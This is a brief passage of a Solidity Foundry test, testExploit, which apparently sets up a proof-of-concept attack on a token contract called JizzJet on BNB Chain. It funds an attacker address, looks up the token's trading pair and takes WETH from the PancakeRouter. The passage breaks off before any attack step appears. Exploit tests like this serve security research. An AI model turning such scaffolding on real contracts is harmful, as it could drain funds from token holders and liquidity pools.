    function testExploit() public {
        // First, let's get some ETH for the attack
        deal(attacker, 100 ether);

        // Get the token contract
        IJizzJet token = IJizzJet(TARGET);

        // Get the pair address from the token contract
        address pair = token.uniswapV2Pair();

        // Get WETH address from PancakeRouter
        address pancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address weth = IUniswapV2Router02(pancakeRouter).WETH();

